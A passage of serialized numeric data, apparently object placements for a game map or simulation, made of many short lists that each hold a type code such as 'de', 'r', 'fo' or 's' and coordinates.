11, 298, 0], [1, "de", 0, 8, 286, 0], [1, "de", 2, 36, 299, 0], [1, "de", 2, 37, 280, 0], [1, "de", 3, 38, 291, 0], [1, "de", 1, 48, 287, 0], [1, "de", 1, 46, 277, 0], [1, "de", 1, 53, 278, 0], [1, "de", 3, 48, 295, 0], [1, "de", 0, 57, 294, 0], [1, "de", 1, 65, 290, 0], [1, "de", 1, 84, 292, 0], [1, "de", 2, 77, 295, 0], [1, "de", 2, 84, 287, 0], [1, "de", 0, 74, 279, 0], [1, "de", 3, 65, 274, 0], [1, "de", 2, 71, 267, 0], [1, "de", 2, 65, 261, 0], [1, "de", 2, 47, 264, 0], [1, "de", 3, 47, 258, 0], [1, "de", 3, 53, 251, 0], [1, "de", 2, 40, 253, 0], [1, "de", 0, 35, 244, 0], [1, "de", 0, 37, 233, 0], [1, "de", 3, 44, 226, 0], [1, "de", 2, 37, 219, 0], [1, "de", 2, 54, 234, 0], [1, "de", 1, 66, 234, 0], [1, "de", 2, 65, 241, 0], [1, "de", 0, 68, 249, 0], [1, "de", 3, 78, 257, 0], [1, "de", 2, 86, 253, 0], [1, "de", 2, 83, 245, 0], [1, "de", 1, 82, 238, 0], [1, "de", 3, 76, 235, 0], [1, "de", 2, 86, 232, 0], [1, "de", 0, 86, 224, 0], [1, "de", 2, 76, 226, 0], [1, "de", 2, 61, 228, 0], [1, "de", 2, 58, 217, 0], [1, "de", 0, 49, 217, 0], [1, "de", 19, 11, 179, 0], [1, "de", 20, 17, 180, 0], [1, "de", 22, 18, 181, 0], [1, "de", 19, 30, 184, 0], [1, "de", 19, 27, 187, 0], [1, "de", 19, 30, 195, 0], [1, "de", 19, 18, 192, 0], [1, "de", 19, 44, 182, 0], [1, "de", 19, 49, 182, 0], [1, "de", 19, 54, 182, 0], [1, "de", 19, 59, 183, 0], [1, "de", 19, 56, 186, 0], [1, "de", 19, 46, 188, 0], [1, "de", 19, 58, 193, 0], [1, "de", 19, 67, 187, 0], [1, "de", 19, 65, 192, 0], [1, "de", 19, 71, 180, 0], [1, "de", 19, 78, 187, 0], [1, "de", 19, 80, 194, 0], [1, "de", 19, 72, 193, 0], [1, "de", 19, 82, 182, 0], [1, "de", 19, 88, 185, 0], [1, "de", 19, 87, 189, 0], [1, "de", 19, 86, 197, 0], [1, "de", 19, 85, 203, 0], [1, "de", 19, 74, 200, 0], [1, "de", 19, 70, 202, 0], [1, "de", 19, 83, 199, 0], [1, "de", 19, 86, 208, 0], [1, "de", 19, 84, 214, 0], [1, "de", 19, 83, 211, 0], [1, "de", 19, 84, 217, 0], [1, "de", 19, 77, 210, 0], [1, "de", 19, 71, 210, 0], [1, "de", 19, 73, 213, 0], [1, "de", 19, 66, 207, 0], [1, "de", 19, 66, 204, 0], [1, "de", 19, 62, 209, 0], [1, "de", 19, 63, 201, 0], [1, "de", 19, 56, 205, 0], [1, "de", 19, 49, 199, 0], [1, "de", 19, 50, 205, 0], [1, "de", 19, 40, 197, 0], [1, "de", 19, 38, 198, 0], [1, "de", 19, 40, 208, 0], [1, "de", 19, 36, 204, 0], [1, "de", 19, 33, 204, 0], [1, "de", 19, 29, 202, 0], [1, "de", 19, 27, 200, 0], [1, "de", 19, 26, 193, 0], [1, "de", 19, 18, 201, 0], [1, "de", 19, 20, 199, 0], [1, "de", 19, 12, 196, 0], [1, "de", 19, 12, 204, 0], [1, "de", 19, 11, 201, 0], [1, "de", 19, 23, 208, 0], [1, "de", 19, 31, 214, 0], [1, "de", 19, 26, 215, 0], [1, "de", 19, 36, 217, 0], [1, "de", 19, 32, 223, 0], [1, "de", 19, 26, 223, 0], [1, "de", 19, 18, 218, 0], [1, "de", 19, 15, 215, 0], [1, "de", 19, 17, 212, 0], [1, "de", 19, 15, 224, 0], [1, "de", 19, 19, 229, 0], [1, "de", 19, 10, 230, 0], [1, "de", 19, 22, 240, 0], [1, "de", 19, 13, 238, 0], [1, "de", 19, 13, 243, 0], [1, "de", 19, 24, 244, 0], [1, "de", 19, 24, 250, 0], [1, "de", 19, 28, 253, 0], [1, "de", 19, 33, 255, 0], [1, "de", 19, 34, 260, 0], [1, "de", 19, 31, 260, 0], [1, "de", 19, 38, 267, 0], [1, "de", 19, 44, 264, 0], [1, "de", 19, 43, 261, 0], [1, "de", 19, 16, 257, 0], [1, "de", 19, 22, 258, 0], [1, "de", 19, 12, 253, 0], [1, "de", 19, 8, 242, 0], [1, "de", 19, 8, 255, 0], [1, "de", 19, 15, 264, 0], [1, "de", 19, 20, 265, 0], [1, "de", 19, 12, 271, 0], [1, "de", 19, 8, 272, 0], [1, "de", 19, 13, 277, 0], [1, "de", 19, 21, 277, 0], [1, "de", 19, 21, 281, 0], [1, "de", 19, 27, 282, 0], [1, "de", 19, 29, 278, 0], [1, "de", 19, 29, 273, 0], [1, "de", 19, 36, 271, 0], [1, "de", 19, 8, 278, 0], [1, "de", 19, 11, 286, 0], [1, "de", 19, 17, 291, 0], [1, "de", 19, 14, 294, 0], [1, "de", 19, 8, 292, 0], [1, "de", 19, 12, 300, 0], [1, "de", 19, 18, 298, 0], [1, "de", 19, 16, 301, 0], [1, "de", 19, 27, 296, 0], [1, "de", 19, 25, 292, 0], [1, "de", 19, 23, 301, 0], [1, "de", 19, 28, 301, 0], [1, "de", 19, 35, 297, 0], [1, "de", 19, 37, 301, 0], [1, "de", 19, 43, 301, 0], [1, "de", 19, 46, 294, 0], [1, "de", 19, 46, 288, 0], [1, "de", 19, 40, 287, 0], [1, "de", 19, 50, 301, 0], [1, "de", 19, 58, 301, 0], [1, "de", 19, 64, 301, 0], [1, "de", 19, 71, 301, 0], [1, "de", 19, 80, 301, 0], [1, "de", 19, 87, 301, 0], [1, "de", 19, 86, 294, 0], [1, "de", 19, 87, 290, 0], [1, "de", 19, 82, 286, 0], [1, "de", 19, 75, 285, 0], [1, "de", 19, 66, 292, 0], [1, "de", 19, 66, 288, 0], [1, "de", 19, 58, 288, 0], [1, "de", 19, 67, 282, 0], [1, "de", 19, 61, 281, 0], [1, "de", 19, 60, 295, 0], [1, "de", 19, 50, 282, 0], [1, "de", 19, 47, 283, 0], [1, "de", 19, 48, 281, 0], [1, "de", 19, 44, 277, 0], [1, "de", 19, 41, 282, 0], [1, "de", 19, 38, 281, 0], [1, "de", 19, 42, 288, 0], [1, "de", 19, 52, 281, 0], [1, "de", 19, 50, 275, 0], [1, "de", 19, 39, 277, 0], [1, "de", 19, 38, 284, 0], [1, "de", 19, 51, 285, 0], [1, "de", 19, 38, 278, 0], [1, "de", 19, 47, 272, 0], [1, "de", 19, 44, 267, 0], [1, "de", 19, 76, 280, 0], [1, "de", 19, 78, 272, 0], [1, "de", 19, 68, 275, 0], [1, "de", 19, 70, 265, 0], [1, "de", 19, 65, 263, 0], [1, "de", 19, 64, 262, 0], [1, "de", 19, 60, 268, 0], [1, "de", 19, 56, 266, 0], [1, "de", 19, 55, 260, 0], [1, "de", 19, 59, 258, 0], [1, "de", 19, 62, 255, 0], [1, "de", 19, 67, 253, 0], [1, "de", 19, 69, 256, 0], [1, "de", 19, 44, 253, 0], [1, "de", 19, 44, 250, 0], [1, "de", 19, 36, 245, 0], [1, "de", 19, 39, 239, 0], [1, "de", 19, 42, 234, 0], [1, "de", 19, 37, 235, 0], [1, "de", 19, 45, 226, 0], [1, "de", 19, 46, 222, 0], [1, "de", 19, 51, 218, 0], [1, "de", 19, 68, 218, 0], [1, "de", 19, 74, 224, 0], [1, "de", 19, 76, 218, 0], [1, "de", 19, 84, 221, 0], [1, "de", 19, 88, 223, 0], [1, "de", 19, 76, 230, 0], [1, "de", 19, 86, 234, 0], [1, "de", 19, 79, 237, 0], [1, "de", 19, 75, 243, 0], [1, "de", 19, 81, 245, 0], [1, "de", 19, 83, 247, 0], [1, "de", 19, 88, 247, 0], [1, "de", 19, 84, 254, 0], [1, "de", 19, 86, 251, 0], [1, "de", 19, 85, 260, 0], [1, "de", 19, 79, 260, 0], [1, "de", 19, 76, 251, 0], [1, "de", 19, 72, 251, 0], [1, "de", 19, 69, 251, 0], [1, "de", 19, 87, 266, 0], [1, "de", 19, 89, 270, 0], [1, "de", 19, 87, 271, 0], [1, "de", 19, 82, 277, 0], [1, "de", 19, 87, 284, 0], [1, "de", 19, 87, 237, 0], [1, "de", 19, 88, 179, 0], [1, "de", 19, 50, 191, 0], [1, "de", 19, 52, 221, 0], [1, "de", 19, 34, 234, 0], [1, "de", 19, 27, 233, 0], [1, "de", 19, 37, 293, 0], [1, "de", 29, 13, 181, 0], [1, "de", 29, 8, 180, 0], [1, "de", 30, 13, 186, 0], [1, "de", 31, 24, 183, 0], [1, "de", 32, 33, 185, 0], [1, "de", 32, 37, 182, 0], [1, "de", 29, 45, 183, 0], [1, "de", 30, 48, 183, 0], [1, "de", 30, 58, 181, 0], [1, "de", 30, 66, 188, 0], [1, "de", 30, 66, 182, 0], [1, "de", 29, 63, 196, 0], [1, "de", 29, 54, 194, 0], [1, "de", 30, 79, 189, 0], [1, "de", 30, 87, 182, 0], [1, "de", 30, 83, 185, 0], [1, "de", 29, 88, 189, 0], [1, "de", 29, 85, 202, 0], [1, "de", 31, 82, 203, 0], [1, "de", 32, 80, 201, 0], [1, "de", 32, 87, 209, 0], [1, "de", 32, 83, 214, 0], [1, "de", 30, 88, 220, 0], [1, "de", 30, 78, 229, 0], [1, "de", 30, 73, 223, 0], [1, "de", 29, 74, 217, 0], [1, "de", 29, 67, 217, 0], [1, "de", 30, 72, 208, 0], [1, "de", 30, 73, 199, 0], [1, "de", 30, 65, 207, 0], [1, "de", 29, 63, 210, 0], [1, "de", 29, 50, 204, 0], [1, "de", 30, 41, 205, 0], [1, "de", 29, 35, 205, 0], [1, "de", 30, 27, 202, 0], [1, "de", 30, 20, 201, 0], [1, "de", 29, 10, 203, 0], [1, "de", 29, 14, 196, 0], [1, "de", 29, 24, 187, 0], [1, "de", 29, 28, 223, 0], [1, "de", 29, 32, 212, 0], [1, "de", 30, 28, 214, 0], [1, "de", 31, 24, 218, 0], [1, "de", 29, 36, 219, 0], [1, "de", 29, 37, 217, 0], [1, "de", 29, 52, 217, 0], [1, "de", 29, 59, 217, 0], [1, "de", 29, 69, 231, 0], [1, "de", 29, 64, 242, 0], [1, "de", 30, 53, 253, 0], [1, "de", 30, 45, 250, 0], [1, "de", 30, 58, 261, 0], [1, "de", 30, 73, 276, 0], [1, "de", 30, 64, 276, 0], [1, "de", 30, 82, 285, 0], [1, "de", 30, 65, 293, 0], [1, "de", 30, 56, 288, 0], [1, "de", 30, 45, 296, 0], [1, "de", 30, 40, 288, 0], [1, "de", 30, 37, 283, 0], [1, "de", 30, 53, 280, 0], [1, "de", 30, 41, 277, 0], [1, "de", 29, 28, 296, 0], [1, "de", 29, 18, 292, 0], [1, "de", 29, 24, 284, 0], [1, "de", 30, 10, 295, 0], [1, "de", 30, 10, 286, 0], [1, "de", 30, 15, 279, 0], [1, "de", 30, 15, 269, 0], [1, "de", 30, 21, 259, 0], [1, "de", 30, 12, 256, 0], [1, "de", 30, 31, 245, 0], [1, "de", 30, 12, 240, 0], [1, "de", 30, 28, 235, 0], [1, "de", 30, 13, 226, 0], [1, "de", 30, 39, 231, 0], [1, "de", 30, 61, 226, 0], [1, "r", 96, 262, 0], [1, "r", 97, 262, 0], [1, "r", 98, 262, 0], [1, "r", 97, 270, 0], [1, "r", 97, 271, 0], [1, "r", 97, 272, 0], [1, "r", 97, 273, 0], [1, "r", 97, 274, 0], [1, "r", 97, 275, 0], [1, "r", 97, 276, 0], [1, "r", 97, 277, 0], [1, "r", 97, 278, 0], [1, "r", 98, 270, 0], [1, "r", 98, 271, 0], [1, "r", 98, 272, 0], [1, "r", 98, 273, 0], [1, "r", 98, 274, 0], [1, "r", 98, 275, 0], [1, "r", 98, 276, 0], [1, "r", 98, 277, 0], [1, "r", 98, 278, 0], [1, "r", 96, 283, 0], [1, "r", 97, 283, 0], [1, "r", 97, 284, 0], [1, "r", 97, 285, 0], [1, "r", 98, 283, 0], [1, "r", 98, 284, 0], [1, "r", 98, 285, 0], [1, "r", 96, 270, 0], [1, "r", 96, 271, 0], [1, "r", 96, 272, 0], [1, "r", 96, 273, 0], [1, "r", 96, 274, 0], [1, "r", 96, 275, 0], [1, "r", 96, 276, 0], [1, "r", 96, 277, 0], [1, "r", 96, 278, 0], [1, "r", 44, 248, 0], [1, "de", 16, 94, 290, 0], [1, "de", 16, 94, 252, 0], [1, "de", 16, 94, 228, 0], [1, "de", 17, 94, 200, 0], [1, "r", 95, 282, 1], [1, "r", 95, 281, 1], [1, "r", 94, 281, 1], [1, "r", 90, 281, 1], [1, "r", 91, 282, 1], [1, "r", 89, 281, 1], [1, "r", 85, 276, 1], [1, "r", 85, 277, 1], [1, "r", 86, 278, 1], [1, "p", 0, 85, 279, 1], [1, "r", 86, 279, 1], [1, "r", 87, 280, 1], [1, "r", 96, 281, 0], [1, "r", 97, 281, 0], [1, "r", 98, 281, 0], [1, "r", 98, 282, 0], [1, "r", 97, 282, 0], [1, "r", 96, 282, 0], [1, "r", 68, 261, 1], [1, "fo", 1, 94, 168, 0], [1, "fo", 2, 94, 151, 0], [1, "fo", 1, 94, 138, 0], [1, "fo", 1, 93, 124, 0], [1, "fo", 1, 94, 129, 0], [1, "fo", 1, 93, 113, 0], [1, "fo", 1, 94, 102, 0], [1, "fo", 1, 94, 93, 0], [1, "fo", 1, 93, 90, 0], [1, "fo", 1, 94, 79, 0], [1, "fo", 1, 94, 76, 0], [1, "fo", 1, 93, 70, 0], [1, "fo", 1, 93, 63, 0], [1, "fo", 1, 94, 53, 0], [1, "fo", 1, 93, 10, 0], [1, "fo", 1, 85, 8, 0], [1, "fo", 1, 94, 12, 0], [1, "fo", 1, 66, 13, 0], [1, "fo", 1, 69, 9, 0], [1, "fo", 2, 68, 14, 0], [1, "fo", 2, 66, 25, 0], [1, "fo", 2, 92, 9, 0], [1, "fo", 2, 94, 14, 0], [1, "fo", 2, 87, 9, 0], [1, "fo", 2, 71, 9, 0], [1, "fo", 2, 90, 12, 0], [1, "fo", 2, 91, 13, 0], [1, "fo", 1, 74, 12, 0], [1, "fo", 2, 72, 12, 0], [1, "fo", 2, 75, 13, 0], [1, "fo", 2, 74, 15, 0], [1, "fo", 2, 84, 12, 0], [1, "fo", 2, 81, 14, 0], [1, "fo", 1, 84, 13, 0], [1, "fo", 1, 84, 19, 0], [1, "fo", 1, 11, 9, 0], [1, "fo", 1, 7, 14, 0], [1, "fo", 1, 8, 22, 0], [1, "fo", 1, 7, 34, 0], [1, "fo", 1, 12, 24, 0], [1, "fo", 2, 8, 24, 0], [1, "fo", 2, 9, 21, 0], [1, "fo", 2, 31, 10, 0], [1, "fo", 2, 33, 27, 0], [1, "fo", 2, 9, 34, 0], [1, "fo", 2, 8, 19, 0], [1, "fo", 1, 14, 10, 0], [1, "fo", 2, 13, 9, 0], [1, "fo", 2, 15, 11, 0], [1, "fo", 2, 9, 9, 0], [1, "fo", 2, 9, 10, 0], [1, "fo", 2, 9, 15, 0], [1, "fo", 2, 10, 23, 0], [1, "fo", 2, 34, 29, 0], [1, "fo", 2, 27, 18, 0], [1, "fo", 2, 25, 21, 0], [1, "fo", 2, 20, 18, 0], [1, "fo", 2, 18, 21, 0], [1, "fo", 2, 29, 9, 0], [1, "fo", 2, 13, 14, 0], [1, "fo", 2, 9, 38, 0], [1, "fo", 2, 21, 39, 0], [1, "fo", 2, 84, 26, 0], [1, "fo", 2, 77, 25, 0], [1, "fo", 2, 86, 35, 0], [1, "fo", 1, 70, 35, 0], [1, "fo", 2, 72, 36, 0], [1, "fo", 2, 73, 31, 0], [1, "fo", 2, 89, 39, 0], [1, "fo", 2, 65, 40, 0], [1, "fo", 2, 92, 32, 0], [1, "fo", 2, 90, 28, 0], [1, "de", 22, 25, 266, 0], [1, "de", 22, 17, 206, 0], [1, "de", 19, 8, 184, 0], [1, "de", 19, 22, 183, 0], [1, "de", 19, 35, 188, 0], [1, "de", 19, 36, 192, 0], [1, "de", 19, 50, 277, 0], [1, "de", 19, 35, 279, 0], [1, "t", 4, 7, 178, 0], [1, "t", 1, 7, 179, 0], [1, "t", 3, 7, 180, 0], [1, "t", 2, 7, 181, 0], [1, "t", 5, 7, 182, 0], [1, "t", 4, 7, 183, 0], [1, "t", 3, 7, 184, 0], [1, "t", 4, 7, 185, 0], [1, "t", 2, 7, 186, 0], [1, "t", 1, 7, 187, 0], [1, "t", 4, 7, 188, 0], [1, "t", 3, 7, 189, 0], [1, "t", 5, 7, 190, 0], [1, "t", 1, 7, 191, 0], [1, "t", 3, 7, 192, 0], [1, "t", 4, 7, 193, 0], [1, "t", 3, 7, 194, 0], [1, "t", 5, 7, 195, 0], [1, "t", 2, 7, 196, 0], [1, "t", 4, 7, 197, 0], [1, "b", 2, 7, 198, 0], [1, "t", 4, 7, 199, 0], [1, "t", 2, 7, 200, 0], [1, "t", 5, 7, 201, 0], [1, "t", 2, 7, 202, 0], [1, "t", 4, 7, 203, 0], [1, "t", 2, 7, 204, 0], [1, "t", 5, 7, 205, 0], [1, "t", 2, 7, 206, 0], [1, "t", 1, 7, 207, 0], [1, "t", 4, 7, 208, 0], [1, "t", 3, 7, 209, 0], [1, "t", 1, 7, 210, 0], [1, "b", 0, 7, 211, 0], [1, "t", 3, 7, 212, 0], [1, "t", 4, 7, 213, 0], [1, "t", 3, 7, 214, 0], [1, "t", 5, 7, 215, 0], [1, "t", 5, 7, 216, 0], [1, "t", 3, 7, 217, 0], [1, "t", 1, 7, 218, 0], [1, "t", 4, 7, 219, 0], [1, "b", 2, 7, 220, 0], [1, "t", 1, 7, 221, 0], [1, "t", 2, 7, 222, 0], [1, "t", 4, 7, 223, 0], [1, "t", 3, 7, 224, 0], [1, "t", 1, 7, 225, 0], [1, "t", 4, 7, 226, 0], [1, "t", 2, 7, 227, 0], [1, "t", 5, 7, 228, 0], [1, "t", 3, 7, 229, 0], [1, "t", 1, 7, 230, 0], [1, "t", 4, 7, 231, 0], [1, "b", 2, 7, 232, 0], [1, "t", 5, 7, 233, 0], [1, "t", 1, 7, 234, 0], [1, "t", 3, 7, 235, 0], [1, "t", 4, 7, 236, 0], [1, "t", 2, 7, 237, 0], [1, "t", 5, 7, 238, 0], [1, "b", 3, 7, 239, 0], [1, "t", 2, 7, 240, 0], [1, "t", 1, 7, 241, 0], [1, "t", 2, 7, 242, 0], [1, "t", 4, 7, 243, 0], [1, "t", 3, 7, 244, 0], [1, "t", 4, 7, 245, 0], [1, "t", 1, 7, 246, 0], [1, "b", 0, 7, 247, 0], [1, "t", 3, 7, 248, 0], [1, "t", 5, 7, 249, 0], [1, "t", 2, 7, 250, 0], [1, "t", 1, 7, 251, 0], [1, "t", 4, 7, 252, 0], [1, "t", 3, 7, 253, 0], [1, "t", 5, 7, 254, 0], [1, "t", 1, 7, 255, 0], [1, "t", 4, 7, 256, 0], [1, "t", 1, 7, 257, 0], [1, "t", 2, 7, 258, 0], [1, "t", 5, 7, 260, 0], [1, "t", 3, 7, 259, 0], [1, "t", 1, 7, 261, 0], [1, "t", 3, 7, 262, 0], [1, "t", 4, 7, 263, 0], [1, "t", 1, 7, 264, 0], [1, "t", 2, 7, 265, 0], [1, "t", 5, 7, 266, 0], [1, "t", 2, 7, 267, 0], [1, "t", 2, 7, 269, 0], [1, "b", 2, 7, 268, 0], [1, "t", 4, 7, 270, 0], [1, "t", 1, 7, 271, 0], [1, "t", 5, 7, 272, 0], [1, "b", 2, 7, 273, 0], [1, "t", 4, 7, 274, 0], [1, "t", 2, 7, 275, 0], [1, "t", 5, 7, 276, 0], [1, "t", 5, 7, 277, 0], [1, "t", 2, 7, 278, 0], [1, "t", 1, 7, 279, 0], [1, "t", 4, 7, 280, 0], [1, "b", 1, 7, 281, 0], [1, "t", 3, 7, 282, 0], [1, "t", 4, 7, 283, 0], [1, "t", 1, 7, 284, 0], [1, "t", 3, 7, 285, 0], [1, "t", 5, 7, 286, 0], [1, "t", 4, 7, 288, 0], [1, "t", 2, 7, 287, 0], [1, "b", 0, 7, 289, 0], [1, "t", 4, 7, 290, 0], [1, "t", 2, 7, 291, 0], [1, "t", 5, 7, 292, 0], [1, "t", 3, 7, 293, 0], [1, "t", 1, 7, 294, 0], [1, "t", 4, 7, 295, 0], [1, "t", 3, 7, 296, 0], [1, "t", 1, 7, 297, 0], [1, "t", 4, 7, 298, 0], [1, "t", 2, 7, 299, 0], [1, "b", 0, 7, 300, 0], [1, "t", 2, 7, 301, 0], [1, "r", 196, 271, 0], [1, "r", 199, 274, 0], [1, "r", 167, 238, 0], [1, "r", 171, 240, 0], [1, "r", 189, 207, 0], [1, "r", 192, 209, 0], [1, "r", 198, 271, 0], [1, "r", 197, 271, 0], [1, "r", 198, 272, 0], [1, "r", 197, 272, 0], [1, "r", 196, 272, 0], [1, "r", 195, 272, 0], [1, "r", 199, 272, 0], [1, "r", 199, 273, 0], [1, "r", 198, 273, 0], [1, "r", 197, 273, 0], [1, "r", 196, 273, 0], [1, "r", 198, 274, 0], [1, "r", 197, 274, 0], [1, "r", 195, 273, 0], [1, "r", 196, 274, 0], [1, "r", 198, 275, 0], [1, "r", 197, 275, 0], [1, "r", 200, 274, 0], [1, "r", 200, 273, 0], [1, "r", 199, 275, 0], [1, "plm", 2, 200, 272, 0], [1, "plm", 1, 195, 271, 0], [1, "plm", 0, 199, 268, 0], [1, "plm", 0, 193, 277, 0], [1, "plm", 1, 199, 276, 0], [1, "s", 1, 200, 275, 1], [1, "s", 1, 194, 272, 1], [1, "s", 2, 193, 270, 1], [1, "g", 2, 193, 273, 1], [1, "g", 2, 201, 267, 1], [1, "m", 2, 220, 298, 1], [1, "m", 1, 219, 292, 1], [1, "m", 1, 214, 297, 1], [1, "r", 168, 238, 0], [1, "r", 169, 238, 0], [1, "r", 170, 238, 0], [1, "r", 171, 239, 0], [1, "r", 170, 239, 0], [1, "r", 169, 239, 0], [1, "r", 168, 239, 0], [1, "r", 167, 239, 0], [1, "r", 166, 239, 0], [1, "r", 166, 240, 0], [1, "r", 167, 240, 0], [1, "r", 168, 240, 0], [1, "r", 169, 240, 0], [1, "r", 170, 240, 0], [1, "r", 168, 241, 0], [1, "r", 169, 241, 0], [1, "r", 170, 241, 0], [1, "r", 171, 241, 0], [1, "plm", 2, 171, 238, 0], [1, "plm", 1, 166, 238, 0], [1, "plm", 0, 167, 237, 0], [1, "plm", 0, 171, 242, 0], [1, "plm", 0, 165, 243, 0], [1, "plm", 0, 171, 235, 0], [1, "plm", 0, 174, 241, 0], [1, "s", 1, 165, 239, 1], [1, "s", 1, 172, 241, 1], [1, "s", 0, 170, 237, 1], [1, "s", 1, 171, 237, 1], [1, "s", 2, 174, 236, 1], [1, "s", 2, 162, 241, 1], [1, "s", 2, 170, 246, 1], [1, "s", 2, 167, 235, 1], [1, "s", 2, 176, 243, 1], [1, "r", 190, 207, 0], [1, "r", 191, 207, 0], [1, "r", 192, 208, 0], [1, "r", 191, 208, 0], [1, "r", 190, 208, 0], [1, "r", 189, 208, 0], [1, "r", 188, 208, 0], [1, "r", 189, 209, 0], [1, "r", 190, 209, 0], [1, "r", 191, 209, 0], [1, "r", 188, 209, 0], [1, "r", 190, 210, 0], [1, "r", 191, 210, 0], [1, "r", 192, 210, 0], [1, "plm", 2, 189, 210, 0], [1, "plm", 2, 192, 205, 0], [1, "plm", 1, 192, 207, 0], [1, "plm", 0, 193, 210, 0], [1, "plm", 0, 187, 208, 0], [1, "plm", 0, 197, 206, 0], [1, "plm", 0, 191, 213, 0], [1, "plm", 0, 190, 204, 0], [1, "s", 1, 188, 207, 1], [1, "s", 1, 190, 211, 1], [1, "s", 2, 188, 213, 1], [1, "s", 2, 187, 205, 1], [1, "s", 0, 194, 210, 1], [1, "s", 0, 198, 207, 1], [1, "s", 1, 193, 204, 1], [1, "s", 1, 193, 213, 1], [1, "s", 2, 198, 212, 1], [1, "s", 2, 182, 208, 1], [1, "s", 1, 204, 271, 1], [1, "s", 0, 203, 272, 1], [1, "s", 0, 189, 275, 1], [1, "s", 0, 195, 265, 1], [1, "s", 2, 196, 264, 1], [1, "s", 2, 186, 274, 1], [1, "s", 2, 197, 280, 1], [1, "s", 0, 217, 282, 1], [1, "s", 1, 214, 285, 1], [1, "s", 1, 214, 274, 1], [1, "s", 1, 203, 282, 1], [1, "s", 1, 205, 290, 1], [1, "s", 0, 207, 292, 1], [1, "s", 0, 197, 297, 1], [1, "s", 0, 184, 287, 1], [1, "s", 2, 213, 289, 1], [1, "s", 2, 196, 294, 1], [1, "s", 2, 187, 286, 1], [1, "s", 1, 192, 289, 1], [1, "s", 1, 189, 299, 1], [1, "s", 0, 213, 273, 1], [1, "g", 2, 212, 278, 1], [1, "g", 1, 200, 288, 1], [1, "g", 2, 215, 265, 1], [1, "g", 2, 183, 281, 1], [1, "s", 0, 178, 295, 1], [1, "s", 0, 167, 281, 1], [1, "s", 0, 175, 263, 1], [1, "s", 1, 176, 293, 1], [1, "s", 1, 163, 285, 1], [1, "s", 1, 177, 266, 1], [1, "s", 1, 161, 272, 1], [1, "s", 2, 185, 261, 1], [1, "c", 0, 217, 270, 1], [1, "c", 0, 220, 278, 1], [1, "c", 0, 217, 283, 1], [1, "c", 0, 220, 287, 1], [1, "c", 0, 210, 292, 1], [1, "c", 0, 205, 297, 1], [1, "c", 0, 198, 293, 1], [1, "c", 0, 208, 283, 1], [1, "c", 0, 197, 283, 1], [1, "c", 0, 190, 289, 1], [1, "c", 0, 183, 296, 1], [1, "c", 0, 189, 291, 1], [1, "c", 0, 178, 284, 1], [1, "c", 0, 208, 265, 1], [1, "c", 0, 169, 292, 1], [1, "s", 1, 158, 294, 1], [1, "s", 0, 151, 297, 1], [1, "s", 0, 147, 288, 1], [1, "c", 0, 150, 289, 1], [1, "c", 0, 160, 282, 1], [1, "c", 0, 146, 274, 1], [1, "c", 0, 167, 264, 1], [1, "c", 0, 165, 267, 1], [1, "g", 0, 189, 257, 1], [1, "g", 1, 197, 248, 1], [1, "g", 2, 170, 255, 1], [1, "g", 2, 212, 234, 1], [1, "g", 2, 189, 230, 1], [1, "g", 2, 173, 221, 1], [1, "g", 1, 210, 214, 1], [1, "s", 1, 153, 257, 1], [1, "s", 0, 158, 255, 1], [1, "s", 0, 184, 248, 1], [1, "s", 0, 212, 254, 1], [1, "s", 1, 203, 249, 1], [1, "s", 2, 204, 252, 1], [1, "s", 2, 187, 248, 1], [1, "s", 0, 206, 237, 1], [1, "s", 0, 196, 227, 1], [1, "s", 0, 181, 228, 1], [1, "s", 1, 199, 227, 1], [1, "s", 1, 208, 238, 1], [1, "s", 1, 179, 222, 1], [1, "s", 1, 213, 223, 1], [1, "s", 2, 182, 222, 1], [1, "s", 2, 211, 226, 1], [1, "s", 2, 214, 214, 1], [1, "s", 2, 201, 216, 1], [1, "s", 2, 215, 192, 1], [1, "s", 1, 210, 198, 1], [1, "s", 1, 198, 196, 1], [1, "s", 2, 208, 199, 1], [1, "s", 2, 187, 192, 1], [1, "s", 1, 179, 198, 1], [1, "s", 2, 177, 197, 1], [1, "s", 0, 164, 197, 1], [1, "s", 1, 159, 193, 1], [1, "s", 1, 149, 206, 1], [1, "s", 1, 164, 209, 1], [1, "s", 2, 165, 210, 1], [1, "s", 2, 161, 191, 1], [1, "s", 1, 162, 224, 1], [1, "s", 0, 150, 236, 1], [1, "s", 1, 149, 239, 1], [1, "s", 2, 153, 236, 1], [1, "s", 2, 160, 223, 1], [1, "s", 2, 151, 207, 1], [1, "s", 2, 147, 220, 1], [1, "s", 2, 145, 265, 1], [1, "s", 2, 145, 285, 1], [1, "c", 0, 152, 266, 1], [1, "c", 0, 185, 271, 1], [1, "c", 0, 210, 254, 1], [1, "c", 0, 209, 256, 1], [1, "c", 0, 198, 254, 1], [1, "c", 0, 213, 246, 1], [1, "c", 0, 216, 237, 1], [1, "c", 0, 204, 240, 1], [1, "c", 0, 196, 234, 1], [1, "c", 0, 188, 238, 1], [1, "c", 0, 182, 245, 1], [1, "c", 0, 173, 252, 1], [1, "c", 0, 153, 248, 1], [1, "c", 0, 158, 233, 1], [1, "c", 0, 147, 230, 1], [1, "c", 0, 151, 224, 1], [1, "c", 0, 157, 214, 1], [1, "c", 0, 167, 219, 1], [1, "c", 0, 171, 208, 1], [1, "c", 0, 179, 219, 1], [1, "c", 0, 176, 229, 1], [1, "c", 0, 195, 221, 1], [1, "c", 0, 207, 222, 1], [1, "c", 0, 214, 207, 1], [1, "c", 0, 205, 210, 1], [1, "c", 0, 204, 196, 1], [1, "c", 0, 214, 196, 1], [1, "c", 0, 190, 199, 1], [1, "c", 0, 184, 194, 1], [1, "c", 0, 172, 199, 1], [1, "c", 0, 161, 204, 1], [1, "c", 0, 157, 196, 1], [1, "c", 0, 149, 194, 1], [1, "c", 0, 147, 208, 1], [1, "c", 0, 207, 274, 1], [1, "c", 0, 217, 258, 1], [1, "c", 0, 201, 260, 1], [1, "c", 0, 178, 276, 1], [1, "c", 0, 187, 265, 1], [1, "s", 1, 204, 260, 1], [1, "s", 1, 216, 260, 1], [1, "s", 1, 187, 255, 1], [1, "s", 2, 189, 254, 1], [1, "s", 2, 212, 257, 1], [1, "s", 2, 182, 286, 1], [1, "s", 2, 169, 280, 1], [1, "s", 2, 217, 273, 1], [1, "s", 2, 215, 282, 1], [1, "s", 2, 172, 263, 1], [1, "s", 2, 176, 267, 1], [1, "s", 2, 215, 251, 1], [1, "fod", 1, 221, 282, 0], [1, "fod", 1, 222, 284, 0], [1, "fod", 1, 221, 290, 0], [1, "fod", 1, 222, 294, 0], [1, "fod", 1, 221, 297, 0], [1, "fod", 1, 223, 298, 0], [1, "fod", 1, 222, 300, 0], [1, "fod", 1, 218, 301, 0], [1, 